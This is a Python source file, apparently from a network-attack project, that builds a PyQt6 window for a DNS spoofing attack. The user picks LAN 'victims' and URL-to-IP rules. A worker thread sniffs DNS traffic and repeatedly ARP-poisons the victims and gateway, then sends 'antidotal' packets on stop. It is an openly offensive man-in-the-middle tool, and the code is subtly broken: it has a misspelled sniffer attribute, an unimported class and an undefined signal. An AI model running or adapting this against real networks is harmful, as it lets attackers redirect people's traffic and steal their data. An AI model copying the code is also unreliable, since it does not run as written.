from PyQt6.QtCore import *
from PyQt6.QtGui import *
from PyQt6.QtWidgets import *
from attacks.arp_spoof import ARPAttackSettings
from components import HostList, InterfaceChooser, Toggle, DragDropHostList
from attacks import (
    DNSEntry,
    DNSAttackSettings,
    send_antidotal_packets,
    send_poisonous_packets,
    send_poisonous_pings,
    handle_packet)
from util.dataclasses import Interface

class AttackWorker(QObject):
    finished = pyqtSignal()

    def __init__(self, settings: DNSAttackSettings):
        super().__init__()
        self.settings = settings

    def run(self):
        print('Attack starting')

        self.sniffer = AsyncSniffer(
            filter='udp port 53',
            iface=self.settings.arp_settings.interface.name,
            prn=lambda p: handle_packet(self.settings, p)
        )
        self.snifer.start()

        # Ping victims to ensure they know of each others existence
        send_poisonous_pings(self.settings.arp_settings)

        # do the initial chache poisoning
        for _ in range(self.settings.arp_settings.initial_packets):
            send_poisonous_packets(self.settings.arp_settings)

        # perform poisoning every so often to prevent chache healing
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.poison)
        self.timer.start(self.settings.arp_settings.seconds_interval * 1000)

    def poison(self):
        print('poisoning...')
        send_poisonous_packets(self.settings.arp_settings)

    def stop(self):
        print('Attack stopping...')

        self.sniffer.stop(join=True)

        # heal the victims' caches
        for _ in range(self.settings.arp_settings.initial_packets):
            send_antidotal_packets(self.settings.arp_settings)

        self.timer.stop()
        self.finished.emit()

class DNSWindow(QWidget):
    INTERFACE_CHOOSER = 'interface_chooser'
    HOST_LIST = 'host_list'
    VICTIM_LIST = 'victims'
    ACTIVATION = 'activation'
    DNS_TABLE = 'dns_table'
    DNS_ADD = 'dns_add'
    DNS_DELETE = 'dns_delete'

    def __init__(self):
        super().__init__()
        self.widgets = { }
        
        self.construct_layout()
        self.setup_behavior()
        self.widgets[self.INTERFACE_CHOOSER].scan()

    def construct_layout(self):
        self.setWindowTitle('DNS attack')
        self.setFixedSize(QSize(1000, 500))

        interface = self.widgets[self.INTERFACE_CHOOSER] = InterfaceChooser()
        hosts = self.widgets[self.HOST_LIST] = HostList()

        layout = QGridLayout(self)
        layout.addWidget(interface, 0, 0)
        layout.addWidget(hosts, 1, 0)
        layout.addWidget(self.create_options_widget(), 0, 1, 2, 1)

    def create_options_widget(self) -> QGroupBox:
        victims = self.widgets[self.VICTIM_LIST] = DragDropHostList(removable_items=True)
        activation = self.widgets[self.ACTIVATION] = Toggle(self, 'Stop', 'Start')
        dns = self.widgets[self.DNS_TABLE] = QTableWidget()
        dns_add = self.widgets[self.DNS_ADD] = QPushButton()
        dns_delete = self.widgets[self.DNS_DELETE] = QPushButton()

        victims.setAcceptDrops(True)
        victims.setDragDropMode(QAbstractItemView.DragDropMode.DragDrop)

        dns_add.setIcon(QIcon('./add.svg'))
        dns_add.setFixedSize(QSize(44, 22))
        dns_add.setStyleSheet('background: transparent; border: 0; margin-right: 22px;')
        dns_add.setIconSize(QSize(16, 16))
        dns_add.pressed.connect(lambda: dns_add.setIconSize(QSize(15, 15)))
        dns_add.clicked.connect(lambda: dns_add.setIconSize(QSize(16, 16)))

        dns_delete.setIcon(QIcon('./delete.svg'))
        dns_delete.setFixedSize(QSize(44, 44))
        dns_delete.setStyleSheet('background: transparent; border: 0; margin-top: 22px; margin-right: 22px;')
        dns_delete.setIconSize(QSize(16, 16))
        dns_delete.pressed.connect(lambda: dns_delete.setIconSize(QSize(15, 15)))
        dns_delete.clicked.connect(lambda: dns_delete.setIconSize(QSize(16, 16)))

        headers = ['URL', 'Type', 'IP']
        dns.setColumnCount(len(headers))
        dns.setHorizontalHeaderLabels(headers)
        dns.verticalHeader().setVisible(False)
        dns.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOn)
        dns.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)

        dns_layout = QGridLayout()
        dns_layout.addWidget(dns, 0, 0)
        dns_layout.addWidget(dns_delete, 0, 0, Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignRight)
        dns_layout.addWidget(dns_add, 0, 0, Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignRight)

        dns_box = QGroupBox()
        dns_box.setTitle('DNS rules')
        dns_box.setLayout(dns_layout)


        victim_layout = QHBoxLayout()
        victim_layout.addWidget(victims)

        victim_box = QGroupBox()
        victim_box.setTitle('Victims')
        victim_box.setLayout(victim_layout)

        sublayout = QHBoxLayout()
        sublayout.addWidget(victim_box, 1)
        sublayout.addWidget(dns_box, 2)

        layout = QVBoxLayout()
        layout.addLayout(sublayout)
        layout.addWidget(activation)

        box = QGroupBox()
        box.setTitle('Attack settings')
        box.setLayout(layout)

        return box
    
    def setup_behavior(self):
        interface = self.widgets[self.INTERFACE_CHOOSER]
        hosts = self.widgets[self.HOST_LIST]
        dns = self.widgets[self.DNS_TABLE]

        interface.interface_changed.connect(hosts.set_interface)

        self.widgets[self.DNS_ADD].clicked.connect(lambda: dns.insertRow(dns.rowCount()))
        self.widgets[self.DNS_DELETE].clicked.connect(self.delete_selected_dns_rows)

    def get_valid_dns_entries(self) -> list[DNSEntry]:
        dns: QTableWidget = self.widgets[self.DNS_TABLE]
        model = dns.model()

        entries = []

        for row in range(dns.rowCount()):
            entry = DNSEntry(
                model.data(model.index(row, 0)),
                model.data(model.index(row, 1)),
                model.data(model.index(row, 2))
            )

            if entry.url and entry.type and entry.ip:
                entries.append(entry)

        return entries

    def delete_selected_dns_rows(self):
        dns: QTableWidget = self.widgets[self.DNS_TABLE]

        indices = [index.row() for index in dns.selectionModel().selectedRows()]

        # rows need to deleted in descending order
        for index in sorted(indices, reverse=True):
            dns.removeRow(index)

    def on_toggle(self, active: bool):
        if active:
            # create the attack
            self.thread = QThread()
            self.worker = AttackWorker(self.construct_attack_settings())
            self.worker.moveToThread(self.thread)

            # connect signals and slots
            self.thread.started.connect(self.worker.run)
            self.stop_attack.connect(self.worker.stop)
            self.worker.finished.connect(self.worker.deleteLater)
            self.worker.finished.connect(self.thread.quit)
            self.thread.finished.connect(self.thread.deleteLater)

            self.thread.finished.connect(lambda: self.widgets[self.ACTIVATION].setEnabled(True))

            # start the attack
            self.thread.start()
        else:
            # stop the attack
            self.widgets[self.ACTIVATION].setEnabled(False)
            self.stop_attack.emit()

    def construct_attack_settings(self) -> DNSAttackSettings:
        host_list = self.widgets[self.HOST_LIST]
        hosts = host_list.widgets[host_list.HOST_LIST].hosts()

        interface = self.widgets[self.INTERFACE_CHOOSER].selected
        sources = self.widgets[self.VICTIM_LIST].hosts()
        # find the gateway Host object in host_list
        # this could be done more cleanly
        destinations = [host for host in hosts if host.ip_addr == interface.gateway]

        return DNSAttackSettings(
            ARPAttackSettings(
                interface,
                sources,
                destinations,
                True,
                4,
                10
            ),
            self.get_valid_dns_entries())
